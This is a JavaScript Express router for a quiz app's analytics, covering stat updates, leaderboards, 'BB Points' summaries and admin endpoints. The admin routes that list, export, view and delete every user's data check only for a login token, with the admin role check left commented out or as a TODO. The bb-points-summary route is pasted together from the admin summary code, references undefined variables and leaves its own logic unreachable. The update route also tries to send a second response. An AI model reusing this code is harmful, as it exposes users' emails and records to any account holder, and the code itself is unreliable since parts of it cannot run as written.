import mongoose from "mongoose";

import express from "express";

import { authenticateToken } from "../middleware/authMiddleware.js";

import PerformanceAnalytics from "../models/PerformanceAnalytics.js";

import { userModel } from "../models/userModel.js";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const router = express.Router();



// 📊 Update analytics after quiz completion

router.post('/update-analytics', authenticateToken, async (req, res) => {

  try {

    console.log('📊 Analytics update request:', req.body);

    console.log('👤 User ID:', req.user?.userId);

    

    const {

      quizMode,

      totalQuestions,

      correctAnswers,

      timeSpent,

      questionTimes,

      bbPointsEarned,

      category,

      difficulty

    } = req.body;

    

    const userId = req.user.userId;



    console.log("\n📊 ============ ANALYTICS UPDATE REQUEST ============");

    console.log("👤 User:", userId);

    console.log("📝 Quiz Data:", { quizMode, totalQuestions, correctAnswers, timeSpent });

    

    // ✅ CRITICAL CHECK: BB Points logic

    if (quizMode === 'TIMED') {

      console.log("💰 TIMED MODE: BB Points will be calculated and added to cumulativeScore");

    } else {

      console.log("❌ NON-TIMED MODE:", quizMode, "- NO BB Points will be added to cumulativeScore");

    }



    // Validation

    if (!quizMode || !totalQuestions || correctAnswers === undefined || !timeSpent) {

      return res.status(400).json({

        success: false,

        message: "Missing required fields: quizMode, totalQuestions, correctAnswers, timeSpent"

      });

    }

    

    // Validate quiz mode

    const validModes = ['TIMED', 'UNTIMED', 'ON-THE-GO'];

    if (!validModes.includes(quizMode)) {

      return res.status(400).json({

        success: false,

        message: "Invalid quiz mode. Must be one of: " + validModes.join(', ')

      });

    }

    

    // Find or create analytics record

    let analytics = await PerformanceAnalytics.findOne({ userId });

    

    if (!analytics) {

      console.log('🆕 Creating new analytics record for user:', userId);

      analytics = new PerformanceAnalytics({ userId });

    }



    // Validate numbers

    if (totalQuestions <= 0 || correctAnswers < 0 || correctAnswers > totalQuestions || timeSpent < 0) {

      return res.status(400).json({

        success: false,

        message: "Invalid numeric values in quiz data"

      });

    }

    analytics.timeStats[quizMode] = (analytics.timeStats[quizMode] || 0) + timeSpent;



      // Time per question stats update karo

    if (questionTimes && questionTimes.length > 0) {

      const avgTime = questionTimes.reduce((sum, time) => sum + time, 0) / questionTimes.length;

      const fastest = Math.min(...questionTimes);

      const slowest = Math.max(...questionTimes);

      

      if (!analytics.timePerQuestionStats) {

        analytics.timePerQuestionStats = {

          averageTime: 0,

          fastestTime: 0,

          slowestTime: 0

        };

      }

      

      const totalQuizzes = analytics.totalQuizzesTaken;

      analytics.timePerQuestionStats.averageTime = 

        ((analytics.timePerQuestionStats.averageTime * (totalQuizzes - 1)) + avgTime) / totalQuizzes;

      

      analytics.timePerQuestionStats.fastestTime = 

        analytics.timePerQuestionStats.fastestTime === 0 ? 

        fastest : Math.min(analytics.timePerQuestionStats.fastestTime, fastest);

    

    analytics.timePerQuestionStats.slowestTime = 

      Math.max(analytics.timePerQuestionStats.slowestTime, slowest);

  }

  // Use the model method to update analytics

  // await analytics.updateAfterQuiz({



  // ✅ FIXED: Use updated static method with proper BB Points logic

  const updatedAnalytics = await PerformanceAnalytics.updateWithLastQuiz(userId, {

    quizMode,

    totalQuestions,

    correctAnswers,

    timeSpent,

    questionTimes,

    bbPointsEarned,

    category,

    difficulty

  });



  console.log('✅ Analytics successfully updated');

    

  return res.status(200).json({

    success: true,

    message: 'Analytics updated successfully!',

    analytics: {

      totalQuizzesTaken: updatedAnalytics.totalQuizzesTaken,

      totalQuestionsAttempted: updatedAnalytics.totalQuestionsAttempted,

      totalCorrectQuestions: updatedAnalytics.totalCorrectQuestions,

      accuracyPercentage: updatedAnalytics.accuracyPercentage,

      cumulativeScore: updatedAnalytics.cumulativeScore,

      timeStats: updatedAnalytics.timeStats,

      timePerQuestionStats: updatedAnalytics.timePerQuestionStats,

      lastQuiz: updatedAnalytics.lastQuiz,

      questionTimes: questionTimes || []

    }

  });



  console.log("✅ ============ ANALYTICS UPDATE SUCCESSFUL ============");

    console.log("📈 Final Results:");

    console.log("   - Quiz Mode:", quizMode);

    console.log("   - Total BB Points (cumulativeScore):", updatedAnalytics.cumulativeScore);

    console.log("   - Last Quiz BB Points:", updatedAnalytics.lastQuiz.bbPointsEarned);

    console.log("   - Total Quizzes:", updatedAnalytics.totalQuizzesTaken);

    console.log("   - Accuracy:", updatedAnalytics.accuracyPercentage + "%");

    console.log("============================================\n");



    res.json({

      success: true,

      message: "Analytics updated successfully",

      analytics: {

        totalQuizzesTaken: updatedAnalytics.totalQuizzesTaken,

        totalQuestionsAttempted: updatedAnalytics.totalQuestionsAttempted,

        totalCorrectQuestions: updatedAnalytics.totalCorrectQuestions,

        accuracyPercentage: updatedAnalytics.accuracyPercentage,

        cumulativeScore: updatedAnalytics.cumulativeScore, // BB Points (sirf TIMED se)

        timeStats: updatedAnalytics.timeStats,

        timePerQuestionStats: updatedAnalytics.timePerQuestionStats,

        lastQuiz: updatedAnalytics.lastQuiz // Last quiz data (har mode save hoti hai)

      }

    });



  } catch (error) {

    console.error("❌ Analytics update error:", error);

    res.status(500).json({

      success: false,

      message: 'Failed to update analytics',

      error: error.message

    });

  }

});



// 📱 Get user stats (for mobile app) - 4 main points

router.get('/user-stats', authenticateToken, async (req, res) => {

  try {

    console.log('📈 User stats request for user:', req.user.userId);

    

    const userId = req.user.userId;



    console.log("📊 GET USER STATS REQUEST for user:", userId);



    // Find user analytics

    const analytics = await PerformanceAnalytics.findOne({ userId });



    if (!analytics) {

      console.log('📊 No analytics data found, returning default values');

      return res.status(200).json({

        success: true,

        message: "No analytics data found",

        analytics: {

          totalQuizzesTaken: 0,

          totalQuestionsAttempted: 0,

          totalCorrectQuestions: 0,

          accuracyPercentage: 0,

          cumulativeScore: 0, // BB Points = 0

          timeStats: {

            TIMED: 0,

            UNTIMED: 0,

            'ON-THE-GO': 0

          },

          timePerQuestionStats: {

            averageTime: 0,

            fastestTime: 0,

            slowestTime: 0

          },

          lastQuiz: null

        }

      });

    }

    

    console.log('✅ User stats retrieved');

    

    return res.status(200).json({

      success: true,

      message: "User stats retrieved successfully",

      analytics: {

        totalQuizzesTaken: analytics.totalQuizzesTaken,

        totalQuestionsAttempted: analytics.totalQuestionsAttempted,

        totalCorrectQuestions: analytics.totalCorrectQuestions,

        accuracyPercentage: analytics.accuracyPercentage,

        cumulativeScore: analytics.cumulativeScore, // BB Points (sirf TIMED se)

        timeStats: {

          TIMED: analytics.timeStats.TIMED || 0,

          UNTIMED: analytics.timeStats.UNTIMED || 0,

          'ON-THE-GO': analytics.timeStats['ON-THE-GO'] || 0

        },

        timePerQuestionStats: analytics.timePerQuestionStats,

        lastQuiz: analytics.lastQuiz // Last quiz data

      }

    });



  } catch (error) {

    console.error("❌ Get user stats error:", error);

    res.status(500).json({

      success: false,

      message: 'Failed to retrieve stats',

      error: error.message

    });

  }

});



// 🔧 Admin: Get all users' analytics with detailed info

router.get('/admin/all-stats', authenticateToken, async (req, res) => {

  try {

    console.log('🔧 Admin all stats request');

    console.log('👤 Requested by user:', req.user?.userId);

    

    // TODO: Add admin role check here

    // const requestingUser = await userModel.findById(req.user.userId);

    // if (requestingUser.role !== 'admin') {

    //   return res.status(403).json({

    //     success: false,

    //     message: 'Access denied. Admin only.'

    //   });

    // }

    

    // Pagination parameters

    const page = parseInt(req.query.page) || 1;

    const limit = parseInt(req.query.limit) || 50;

    const skip = (page - 1) * limit;

    

    // Sorting parameters

    const sortBy = req.query.sortBy || 'lastUpdated';

    const sortOrder = req.query.sortOrder === 'asc' ? 1 : -1;

    

    // Build sort object

    const sortObject = {};

    sortObject[sortBy] = sortOrder;

    

    // Get total count

    const totalCount = await PerformanceAnalytics.countDocuments();

    

    // Get analytics with user details

    const analytics = await PerformanceAnalytics.find({})

      .populate('userId', 'email profile.firstName profile.lastName role isVerified createdAt')

      .sort(sortObject)

      .skip(skip)

      .limit(limit)

      .lean();

    

    console.log(`✅ Found ${analytics.length} analytics records`);

    

    // Transform data for admin dashboard

    const transformedAnalytics = analytics.map(analytic => ({

      _id: analytic._id,

      user: analytic.userId ? {

        _id: analytic.userId._id,

        email: analytic.userId.email,

        name: `${analytic.userId.profile?.firstName || ''} ${analytic.userId.profile?.lastName || ''}`.trim() || 'No Name',

        role: analytic.userId.role,

        isVerified: analytic.userId.isVerified,

        joinedAt: analytic.userId.createdAt

      } : null,

      // All 7 points for admin

      totalQuizzesTaken: analytic.totalQuizzesTaken,

      totalQuestionsAttempted: analytic.totalQuestionsAttempted,

      totalCorrectQuestions: analytic.totalCorrectQuestions,

      accuracyPercentage: analytic.accuracyPercentage,

      cumulativeScore: analytic.cumulativeScore,

      timeStats: analytic.timeStats,

      timePerQuestionStats: analytic.timePerQuestionStats,

      lastQuiz: analytic.lastQuiz,

      categoryPerformance: analytic.categoryPerformance ? 

        Object.fromEntries(analytic.categoryPerformance) : {},

      difficultyPerformance: analytic.difficultyPerformance,

      lastUpdated: analytic.lastUpdated,

      createdAt: analytic.createdAt

    }));

    

    return res.status(200).json({

      success: true,

      analytics: transformedAnalytics,

      pagination: {

        currentPage: page,

        totalPages: Math.ceil(totalCount / limit),

        totalCount,

        hasMore: skip + analytics.length < totalCount

      },

      count: transformedAnalytics.length

    });

    

  } catch (error) {

    console.error('❌ Get all stats error:', error);

    return res.status(500).json({

      success: false,

      message: 'Failed to retrieve analytics',

      error: error.message

    });

  }

});



// ✅ SAME: Get last quiz details route

router.get("/last-quiz", authenticateToken, async (req, res) => {

  try {

    const userId = req.user.userId;



    console.log("📊 GET LAST QUIZ REQUEST for user:", userId);



    const analytics = await PerformanceAnalytics.findOne({ userId }).select('lastQuiz');



    if (!analytics || !analytics.lastQuiz) {

      return res.json({

        success: true,

        message: "No last quiz data found",

        lastQuiz: null

      });

    }



    console.log("✅ Last quiz data retrieved:");

    console.log("   - Mode:", analytics.lastQuiz.quizMode);

    console.log("   - BB Points:", analytics.lastQuiz.bbPointsEarned);

    console.log("   - Accuracy:", analytics.lastQuiz.accuracy + "%");



    res.json({

      success: true,

      message: "Last quiz data retrieved successfully",

      lastQuiz: analytics.lastQuiz

    });



  } catch (error) {

    console.error("❌ Get last quiz error:", error);

    res.status(500).json({

      success: false,

      message: "Failed to retrieve last quiz data",

      error: error.message

    });

  }

});



// 📊 Admin: Get summary statistics

router.get('/admin/summary', authenticateToken, async (req, res) => {

  try {

    console.log('📊 Admin summary stats request');

    

    // TODO: Add admin role check

    

    // Use aggregation pipeline for efficient calculation

    const summaryPipeline = [

      {

        $group: {

          _id: null,

          totalUsers: { $sum: 1 },

          totalQuizzesTaken: { $sum: "$totalQuizzesTaken" },

          totalQuestionsAttempted: { $sum: "$totalQuestionsAttempted" },

          totalCorrectQuestions: { $sum: "$totalCorrectQuestions" },

          avgAccuracy: { $avg: "$accuracyPercentage" },

          avgCumulativeScore: { $avg: "$cumulativeScore" },

          totalTimedTime: { $sum: "$timeStats.TIMED" },

          totalUntimedTime: { $sum: "$timeStats.UNTIMED" },

          totalTutorTime: { $sum: "$timeStats.TUTOR" },

          totalOnTheGoTime: { $sum: "$timeStats.ON-THE-GO" }

        }

      }

    ];



    // Run the summary pipeline and assign result to summary

    const [summary] = await PerformanceAnalytics.aggregate(summaryPipeline);



    // Total quizzes taken across all users

    const totalQuizzesTaken = await PerformanceAnalytics.aggregate([

      { $group: { _id: null, total: { $sum: "$totalQuizzesTaken" } } }

    ]);

    

    // Total questions attempted across all users

    const totalQuestionsAttempted = await PerformanceAnalytics.aggregate([

      { $group: { _id: null, total: { $sum: "$totalQuestionsAttempted" } } }

    ]);

    

    // Average accuracy across all users

    const averageAccuracy = await PerformanceAnalytics.aggregate([

      { $group: { _id: null, avgAccuracy: { $avg: "$accuracyPercentage" } } }

    ]);

    

    // Mode-wise time distribution

    const modeTimeStats = await PerformanceAnalytics.aggregate([

      {

        $group: {

          _id: null,

          totalTimedTime: { $sum: "$timeStats.TIMED" },

          totalUntimedTime: { $sum: "$timeStats.UNTIMED" },

          totalTutorTime: { $sum: "$timeStats.TUTOR" },

          totalOnTheGoTime: { $sum: "$timeStats.ON-THE-GO" }

        }

      }

    ]);

    

    // Top performers

    const topPerformers = await PerformanceAnalytics.find({})

      .populate('userId', 'email profile.firstName profile.lastName')

      .sort({ accuracyPercentage: -1 })

      .limit(5)

      .lean();

    

    // Most active users

    const mostActiveUsers = await PerformanceAnalytics.find({})

      .populate('userId', 'email profile.firstName profile.lastName')

      .sort({ totalQuizzesTaken: -1 })

      .limit(5)

      .lean();

    

    // Category statistics

    const categoryStats = await PerformanceAnalytics.aggregate([

      { $unwind: { path: "$categoryPerformance", preserveNullAndEmptyArrays: true } },

      {

        $group: {

          _id: "$categoryPerformance.k",

          totalAttempted: { $sum: "$categoryPerformance.v.attempted" },

          totalCorrect: { $sum: "$categoryPerformance.v.correct" },

          avgAccuracy: { $avg: "$categoryPerformance.v.accuracy" }

        }

      },

      { $match: { _id: { $ne: null } } },

      { $sort: { totalAttempted: -1 } }

    ]);

    

    return res.status(200).json({

      success: true,

      summary: {

        totalUsersWithAnalytics: summary?.totalUsers || 0,

        totalQuizzesTaken: summary?.totalQuizzesTaken || totalQuizzesTaken[0]?.total || 0,

        totalQuestionsAttempted: summary?.totalQuestionsAttempted || totalQuestionsAttempted[0]?.total || 0,

        totalCorrectQuestions: summary?.totalCorrectQuestions || 0,

        averageAccuracy: Math.round(averageAccuracy[0]?.avgAccuracy || 0),

        averageCumulativeScore: Math.round(summary?.avgCumulativeScore || 0),

        modeTimeDistribution: {

          totalTimedTime: summary?.totalTimedTime || 0,

          totalUntimedTime: summary?.totalUntimedTime || 0,

          totalTutorTime: summary?.totalTutorTime || 0,

          totalOnTheGoTime: summary?.totalOnTheGoTime || 0

        },

        topPerformers: topPerformers.map(p => ({

          userId: p.userId?._id,

          name: `${p.userId?.profile?.firstName || ''} ${p.userId?.profile?.lastName || ''}`.trim() || 'No Name',

          email: p.userId?.email,

          accuracy: p.accuracyPercentage,

          totalQuizzes: p.totalQuizzesTaken

        })),

        mostActiveUsers: mostActiveUsers.map(u => ({

          userId: u.userId?._id,

          name: `${u.userId?.profile?.firstName || ''} ${u.userId?.profile?.lastName || ''}`.trim() || 'No Name',

          email: u.userId?.email,

          totalQuizzes: u.totalQuizzesTaken,

          totalQuestions: u.totalQuestionsAttempted

        })),

        categoryStats

      }

    });

    

  } catch (error) {

    console.error('❌ Get summary stats error:', error);

    return res.status(500).json({

      success: false,

      message: 'Failed to retrieve summary statistics',

      error: error.message

    });

  }

});



// ✅ ENHANCED: BB Points summary route with better calculations

router.get("/bb-points-summary", authenticateToken, async (req, res) => {

  try {

    const userId = req.user.userId;



    console.log("🏆 GET BB POINTS SUMMARY REQUEST for user:", userId);



    const analytics = await PerformanceAnalytics.findOne({ userId });



    if (!analytics) {

      return res.json({

        success: true,

        message: "No analytics data found",

        bbPointsSummary: {

          totalBBPoints: 0,

          lastQuizBBPoints: 0,

          timedQuizCount: 0,

          averageBBPointsPerQuiz: 0

        }

      });

    }



    // ✅ BETTER: Calculate timed quiz count from total time and average time

    const totalTime = analytics.timeStats.TIMED + 

                     analytics.timeStats.UNTIMED + 

                     analytics.timeStats['ON-THE-GO'];

    

    const [summary] = await PerformanceAnalytics.aggregate(summaryPipeline);

    

    // Get top performers

    const topPerformers = await PerformanceAnalytics.find({})

      .populate('userId', 'email profile.firstName profile.lastName')

      .sort({ accuracyPercentage: -1 })

      .limit(5)

      .lean();

    

    // Get most active users

    const mostActiveUsers = await PerformanceAnalytics.find({})

      .populate('userId', 'email profile.firstName profile.lastName')

      .sort({ totalQuizzesTaken: -1 })

      .limit(5)

      .lean();

    

    // Category statistics

    const categoryStats = await PerformanceAnalytics.aggregate([

      { $unwind: { path: "$categoryPerformance", preserveNullAndEmptyArrays: true } },

      {

        $group: {

          _id: "$categoryPerformance.k",

          totalAttempted: { $sum: "$categoryPerformance.v.attempted" },

          totalCorrect: { $sum: "$categoryPerformance.v.correct" },

          avgAccuracy: { $avg: "$categoryPerformance.v.accuracy" }

        }

      },

      { $match: { _id: { $ne: null } } },

      { $sort: { totalAttempted: -1 } }

    ]);

    

    return res.status(200).json({

      success: true,

      summary: {

        totalUsersWithAnalytics: summary?.totalUsers || 0,

        totalQuizzesTaken: summary?.totalQuizzesTaken || totalQuizzesTaken[0]?.total || 0,

        totalQuestionsAttempted: summary?.totalQuestionsAttempted || totalQuestionsAttempted[0]?.total || 0,

        totalCorrectQuestions: summary?.totalCorrectQuestions || 0,

        averageAccuracy: Math.round(averageAccuracy[0]?.avgAccuracy || 0),

        averageCumulativeScore: Math.round(summary?.avgCumulativeScore || 0),

        modeTimeDistribution: {

          totalTimedTime: summary?.totalTimedTime || 0,

          totalUntimedTime: summary?.totalUntimedTime || 0,

          totalTutorTime: summary?.totalTutorTime || 0,

          totalOnTheGoTime: summary?.totalOnTheGoTime || 0

        },

        topPerformers: topPerformers.map(p => ({

          userId: p.userId?._id,

          name: `${p.userId?.profile?.firstName || ''} ${p.userId?.profile?.lastName || ''}`.trim() || 'No Name',

          email: p.userId?.email,

          accuracy: p.accuracyPercentage,

          totalQuizzes: p.totalQuizzesTaken

        })),

        mostActiveUsers: mostActiveUsers.map(u => ({

          userId: u.userId?._id,

          name: `${u.userId?.profile?.firstName || ''} ${u.userId?.profile?.lastName || ''}`.trim() || 'No Name',

          email: u.userId?.email,

          totalQuizzes: u.totalQuizzesTaken,

          totalQuestions: u.totalQuestionsAttempted

        })),

        categoryStats

      }

    });

    const timedRatio = totalTime > 0 ? analytics.timeStats.TIMED / totalTime : 0;

    const estimatedTimedQuizzes = Math.round(analytics.totalQuizzesTaken * timedRatio);



    const bbPointsSummary = {

      totalBBPoints: analytics.cumulativeScore, // Total BB Points (sirf TIMED se)

      lastQuizBBPoints: analytics.lastQuiz?.bbPointsEarned || 0,

      timedQuizCount: estimatedTimedQuizzes,

      averageBBPointsPerQuiz: estimatedTimedQuizzes > 0 ? 

        Math.round(analytics.cumulativeScore / estimatedTimedQuizzes) : 0,

      // ✅ BONUS: Additional insights

      timedTimePercentage: Math.round(timedRatio * 100),

      lastQuizMode: analytics.lastQuiz?.quizMode || null

    };



    console.log("✅ BB Points summary retrieved:");

    console.log("   - Total BB Points:", bbPointsSummary.totalBBPoints);

    console.log("   - Last Quiz BB Points:", bbPointsSummary.lastQuizBBPoints);

    console.log("   - Estimated TIMED Quizzes:", bbPointsSummary.timedQuizCount);

    console.log("   - TIMED Time %:", bbPointsSummary.timedTimePercentage + "%");



    res.json({

      success: true,

      message: "BB Points summary retrieved successfully",

      bbPointsSummary

    });



  } catch (error) {

    console.error("❌ Get BB Points summary error:", error);

    res.status(500).json({

      success: false,

      message: "Failed to retrieve BB Points summary",

      error: error.message

    });

  }

});



// 📈 Admin: Get analytics by user ID

router.get('/admin/user/:userId', authenticateToken, async (req, res) => {

  try {

    const { userId } = req.params;

    

    console.log('📈 Admin requesting analytics for user:', userId);

    

    // TODO: Add admin role check

    

    const analytics = await PerformanceAnalytics.findOne({ userId })

      .populate('userId', 'email profile role isVerified createdAt');

    

    if (!analytics) {

      return res.status(404).json({

        success: false,

        message: 'No analytics found for this user'

      });

    }

    

    // Get user's quiz history (last 10 quizzes)

    // This would require storing individual quiz records

    // For now, we return the last quiz details

    

    return res.status(200).json({

      success: true,

      analytics: {

        user: analytics.userId,

        stats: {

          totalQuizzesTaken: analytics.totalQuizzesTaken,

          totalQuestionsAttempted: analytics.totalQuestionsAttempted,

          totalCorrectQuestions: analytics.totalCorrectQuestions,

          accuracyPercentage: analytics.accuracyPercentage,

          cumulativeScore: analytics.cumulativeScore,

          timeStats: analytics.timeStats,

          timePerQuestionStats: analytics.timePerQuestionStats

        },

        lastQuiz: analytics.lastQuiz,

        categoryPerformance: analytics.categoryPerformance ? 

          Object.fromEntries(analytics.categoryPerformance) : {},

        difficultyPerformance: analytics.difficultyPerformance,

        metadata: {

          lastUpdated: analytics.lastUpdated,

          createdAt: analytics.createdAt

        }

      }

    });

    

  } catch (error) {

    console.error('❌ User analytics error:', error);

    return res.status(500).json({

      success: false,

      message: 'Failed to retrieve user analytics',

      error: error.message

    });

  }

});



// ✅ NEW: Verify BB Points source - Debug endpoint

router.get("/verify-bb-points", authenticateToken, async (req, res) => {

  try {

    const userId = req.user.userId;



    console.log("🔍 VERIFYING BB POINTS SOURCE for user:", userId);



    const analytics = await PerformanceAnalytics.findOne({ userId });



    if (!analytics) {

      return res.json({

        success: false,

        message: "No analytics found for verification"

      });

    }



    const totalTimeSpent = analytics.timeStats.TIMED + 

                          analytics.timeStats.UNTIMED + 

                          analytics.timeStats['ON-THE-GO'];



    const timedRatio = totalTimeSpent > 0 ? (analytics.timeStats.TIMED / totalTimeSpent) * 100 : 0;



    const verification = {

      cumulativeScore: analytics.cumulativeScore,

      timeStats: {

        TIMED: analytics.timeStats.TIMED || 0,

        UNTIMED: analytics.timeStats.UNTIMED || 0,

        'ON-THE-GO': analytics.timeStats['ON-THE-GO'] || 0

      },

      timedTimePercentage: timedRatio.toFixed(2) + '%',

      lastQuizMode: analytics.lastQuiz?.quizMode,

      lastQuizBBPoints: analytics.lastQuiz?.bbPointsEarned || 0,

      totalQuizzes: analytics.totalQuizzesTaken,

      warning: timedRatio < 50 && analytics.cumulativeScore > 0 ? 

        '⚠️ Warning: BB Points detected but TIMED mode time is less than 50%' : 

        '✅ BB Points tracking looks correct',

      recommendation: analytics.cumulativeScore === 0 ? 

        '💡 Take some TIMED quizzes to earn BB Points!' :

        '🎯 Continue taking TIMED quizzes to earn more BB Points'

    };



    console.log("✅ BB Points verification completed:");

    console.log("   - Cumulative Score:", verification.cumulativeScore);

    console.log("   - TIMED Time %:", verification.timedTimePercentage);

    console.log("   - Status:", verification.warning);



    res.json({

      success: true,

      message: "BB Points verification completed",

      verification: verification

    });



  } catch (error) {

    console.error("❌ BB Points verification error:", error);

    res.status(500).json({

      success: false,

      message: "Failed to verify BB Points source",

      error: error.message

    });

  }

});



// 🗑️ Admin: Reset user analytics

router.delete('/admin/reset/:userId', authenticateToken, async (req, res) => {

  try {

    const { userId } = req.params;

    

    console.log('🗑️ Admin resetting analytics for user:', userId);

    

    // TODO: Add admin role check and confirmation

    

    const result = await PerformanceAnalytics.findOneAndDelete({ userId });

    

    if (!result) {

      return res.status(404).json({

        success: false,

        message: 'No analytics found for this user'

      });

    }

    

    console.log('✅ Analytics reset successfully');

    

    return res.status(200).json({

      success: true,

      message: 'User analytics reset successfully'

    });

    

  } catch (error) {

    console.error('❌ Reset analytics error:', error);

    return res.status(500).json({

      success: false,

      message: 'Failed to reset analytics',

      error: error.message

    });

  }

});



// 📥 Admin: Export analytics data

router.get('/admin/export', authenticateToken, async (req, res) => {

  try {

    console.log('📥 Export analytics request');

    

    // TODO: Add admin role check

    

    const format = req.query.format || 'json';

    

    // Get all analytics data with populated user info

    const analytics = await PerformanceAnalytics.find({})

      .populate('userId', 'email profile.firstName profile.lastName')

      .lean();

    

    if (format === 'csv') {

      // Convert to CSV format

      const csvHeaders = [

        'User Email',

        'User Name',

        'Total Quizzes',

        'Questions Attempted',

        'Correct Answers',

        'Accuracy %',

        'Cumulative Score',

        'Time in TIMED',

        'Time in UNTIMED',

        'Time in TUTOR',

        'Time in ON-THE-GO',

        'Avg Time per Question',

        'Last Updated'

      ].join(',');

      

      const csvRows = analytics.map(a => [

        a.userId?.email || '',

        `${a.userId?.profile?.firstName || ''} ${a.userId?.profile?.lastName || ''}`.trim() || 'Unknown',

        a.totalQuizzesTaken,

        a.totalQuestionsAttempted,

        a.totalCorrectQuestions,

        a.accuracyPercentage,

        a.cumulativeScore,

        a.timeStats.TIMED,

        a.timeStats.UNTIMED,

        a.timeStats.TUTOR,

        a.timeStats['ON-THE-GO'],

        a.timePerQuestionStats.averageTime.toFixed(2),

        new Date(a.lastUpdated).toISOString()

      ].join(','));

      

      const csv = [csvHeaders, ...csvRows].join('\n');

      

      res.setHeader('Content-Type', 'text/csv');

      res.setHeader('Content-Disposition', 'attachment; filename=analytics_export.csv');

      return res.send(csv);

    }

    

    // Default to JSON

    res.setHeader('Content-Type', 'application/json');

    res.setHeader('Content-Disposition', 'attachment; filename=analytics_export.json');

    return res.json({

      success: true,

      exportDate: new Date().toISOString(),

      totalRecords: analytics.length,

      data: analytics.map(a => ({

        user: {

          email: a.userId?.email || '',

          name: `${a.userId?.profile?.firstName || ''} ${a.userId?.profile?.lastName || ''}`.trim() || 'Unknown'

        },

        totalQuizzesTaken: a.totalQuizzesTaken,

        totalQuestionsAttempted: a.totalQuestionsAttempted,

        totalCorrectQuestions: a.totalCorrectQuestions,

        accuracyPercentage: a.accuracyPercentage,

        cumulativeScore: a.cumulativeScore,

        timeStats: a.timeStats,

        timePerQuestionStats: a.timePerQuestionStats,

        lastUpdated: a.lastUpdated

      }))

    });

    

  } catch (error) {

    console.error('❌ Export error:', error);

    return res.status(500).json({

      success: false,

      message: 'Failed to export analytics',

      error: error.message

    });

  }

});



// ✅ ENHANCED: Reset analytics route with confirmation

router.delete("/reset-analytics", authenticateToken, async (req, res) => {

  try {

    const userId = req.user.userId;

    const { confirm } = req.query;



    console.log("🗑️ RESET ANALYTICS REQUEST for user:", userId);



    if (confirm !== 'true') {

      return res.status(400).json({

        success: false,

        message: "Please add ?confirm=true to confirm analytics reset"

      });

    }



    const result = await PerformanceAnalytics.deleteOne({ userId });



    if (result.deletedCount === 0) {

      return res.json({

        success: true,

        message: "No analytics data found to delete"

      });

    }



    console.log("✅ Analytics data reset successfully");



    res.json({

      success: true,

      message: "Analytics data reset successfully! Start fresh with TIMED mode testing.",

      note: "Take TIMED quizzes to earn BB Points (cumulativeScore)"

    });



  } catch (error) {

    console.error("❌ Reset analytics error:", error);

    res.status(500).json({

      success: false,

      message: "Failed to reset analytics data",

      error: error.message

    });

  }

});



// ✅ SAME: Analytics overview route

router.get("/overview", authenticateToken, async (req, res) => {

  try {

    const userId = req.user.userId;



    console.log("📊 GET ANALYTICS OVERVIEW REQUEST for user:", userId);



    const analytics = await PerformanceAnalytics.findOne({ userId });



    if (!analytics) {

      return res.json({

        success: true,

        message: "No analytics data found",

        overview: null

      });

    }



    // Calculate additional metrics

    const totalTimeSpent = analytics.timeStats.TIMED + 

                          analytics.timeStats.UNTIMED + 

                          analytics.timeStats['ON-THE-GO'];



    const incorrectQuestions = analytics.totalQuestionsAttempted - analytics.totalCorrectQuestions;



    const overview = {

      basicStats: {

        totalQuizzesTaken: analytics.totalQuizzesTaken,

        totalQuestionsAttempted: analytics.totalQuestionsAttempted,

        totalCorrectQuestions: analytics.totalCorrectQuestions,

        incorrectQuestions,

        accuracyPercentage: analytics.accuracyPercentage,

        cumulativeScore: analytics.cumulativeScore // BB Points

      },

      timeBreakdown: {

        totalTimeSpent,

        timeStats: {

          TIMED: analytics.timeStats.TIMED || 0,

          UNTIMED: analytics.timeStats.UNTIMED || 0,

          'ON-THE-GO': analytics.timeStats['ON-THE-GO'] || 0

        },

        timePerQuestionStats: analytics.timePerQuestionStats

      },

      lastQuizInfo: analytics.lastQuiz,

      timestamps: {

        accountCreated: analytics.createdAt,

        lastUpdated: analytics.lastUpdated

      },

      // ✅ BONUS: BB Points insights

      bbPointsInsights: {

        totalBBPoints: analytics.cumulativeScore,

        lastQuizBBPoints: analytics.lastQuiz?.bbPointsEarned || 0,

        bbPointsSource: 'Only from TIMED mode quizzes'

      }

    };



    console.log("✅ Analytics overview retrieved successfully");



    res.json({

      success: true,

      message: "Analytics overview retrieved successfully",

      overview

    });



  } catch (error) {

    console.error("❌ Get analytics overview error:", error);

    res.status(500).json({

      success: false,

      message: "Failed to retrieve analytics overview",

      error: error.message

    });

  }

});



// ✅ ENHANCED: Leaderboard route with BB Points focus

router.get("/leaderboard", authenticateToken, async (req, res) => {

  try {

    const { limit = 10, mode = 'bb-points' } = req.query;



    console.log("🏆 GET LEADERBOARD REQUEST");

    console.log("📊 Mode:", mode, "Limit:", limit);



    // Build query based on mode

    let sortField = 'cumulativeScore'; // Default sort by BB Points

    if (mode === 'accuracy') sortField = 'accuracyPercentage';

    if (mode === 'questions') sortField = 'totalQuestionsAttempted';

    if (mode === 'quizzes') sortField = 'totalQuizzesTaken';



    const leaderboard = await PerformanceAnalytics.find({})

      .populate('userId', 'email profile.firstName profile.lastName')

      .sort({ [sortField]: -1 })

      .limit(parseInt(limit))

      .select('userId totalQuizzesTaken totalQuestionsAttempted totalCorrectQuestions accuracyPercentage cumulativeScore lastQuiz timeStats');



    const transformedLeaderboard = leaderboard.map((entry, index) => {

      // Calculate TIMED quiz ratio

      const totalTime = entry.timeStats.TIMED + entry.timeStats.UNTIMED + 

                       entry.timeStats['ON-THE-GO'];

      const timedRatio = totalTime > 0 ? (entry.timeStats.TIMED / totalTime) * 100 : 0;



      return {

        rank: index + 1,

        user: {

          _id: entry.userId._id,

          email: entry.userId.email,

          name: `${entry.userId.profile?.firstName || ''} ${entry.userId.profile?.lastName || ''}`.trim() || entry.userId.email.split('@')[0]

        },

        stats: {

          totalQuizzes: entry.totalQuizzesTaken,

          totalQuestions: entry.totalQuestionsAttempted,

          correctAnswers: entry.totalCorrectQuestions,

          accuracy: entry.accuracyPercentage,

          bbPoints: entry.cumulativeScore, // BB Points from TIMED mode only

          lastQuizMode: entry.lastQuiz?.quizMode || null,

          timedModePercentage: Math.round(timedRatio)

        }

      };

    });



    console.log("✅ Leaderboard retrieved successfully");



    res.json({

      success: true,

      message: "Leaderboard retrieved successfully",

      leaderboard: transformedLeaderboard,

      mode,

      count: transformedLeaderboard.length,

      note: "BB Points are earned only from TIMED mode quizzes"

    });



  } catch (error) {

    console.error("❌ Get leaderboard error:", error);

    res.status(500).json({

      success: false,

      message: "Failed to retrieve leaderboard",

      error: error.message

    });

  }

});



